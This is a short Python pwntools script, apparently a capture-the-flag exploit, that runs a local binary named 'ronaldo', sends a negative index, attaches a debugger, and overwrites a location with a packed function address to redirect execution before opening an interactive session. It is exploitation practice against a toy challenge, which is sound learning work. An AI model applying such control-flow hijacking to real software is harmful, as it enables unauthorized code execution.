from pwn import *

pr = process('./ronaldo')


cr7_adrr = 0x0000000000401166


pr.sendline(b'-4')

gdb.attach(pr, gdbscript='''
            gdb ./ronaldo
            break *main+72   
            c
''')

payload = p64(cr7_adrr)       

pr.send(payload)

pr.interactive()